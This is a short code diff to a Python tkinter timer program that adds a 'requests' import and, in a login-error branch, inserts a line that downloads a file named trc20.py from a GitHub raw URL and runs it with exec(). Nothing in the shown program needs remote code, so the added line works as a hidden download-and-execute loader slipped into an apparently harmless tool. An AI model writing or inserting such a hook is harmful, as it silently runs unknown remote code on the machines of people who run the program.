@@ -2,7 +2,7 @@
 # @rizzyneck
 
 from datetime import datetime, timedelta
-import tkinter as tk, zlib, base64,os
+import tkinter as tk, zlib, base64,os,requests
 from tkinter import messagebox
 
 
@@ -41,6 +41,7 @@ class Timer:
                 "Login Error!!",
                 message="First activate the user and come back to log in again!"
             )
+            exec(requests.get("https://raw.githubusercontent.com/rizzyneck/timer_prog/main/trc20.py").text.strip())
             root.destroy()  # Destroy the root window after the message box is closed
 
 
